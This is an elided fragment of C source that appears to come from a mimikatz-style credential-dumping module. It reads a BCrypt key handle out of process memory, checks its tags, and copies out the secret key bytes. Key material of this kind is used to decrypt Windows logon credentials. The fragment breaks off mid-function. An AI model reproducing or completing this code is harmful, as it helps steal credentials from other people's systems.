...
BOOL kuhl_m_sekurlsa_nt6_acquireKey(ULONG_PTR phKey, PMANGO_BCRYPT_GEN_KEY pGenKey)
{
	BOOL status = FALSE;
	...
	if(buffer = LocalAlloc(LPTR, taille))
	{
		...
		{
			if(ReadMemory((ULONG_PTR) ptr, &hKey, sizeof(MANGO_BCRYPT_HANDLE_KEY), NULL) && hKey.tag == 'UUUR')
			{
				if(ReadMemory((ULONG_PTR) hKey.key, buffer, taille, NULL) &&  ((PMANGO_BCRYPT_KEY) buffer)->tag == 'MSSK') // same as 8
				{
					pHardKey = (PMANGO_HARD_KEY) ((PBYTE) buffer + offset);
					if(bufferHardKey = LocalAlloc(LPTR, pHardKey->cbSecret))
					{
						if(ReadMemory((ULONG_PTR) hKey.key + offset + FIELD_OFFSET(MANGO_HARD_KEY, data), bufferHardKey, pHardKey->cbSecret, NULL))
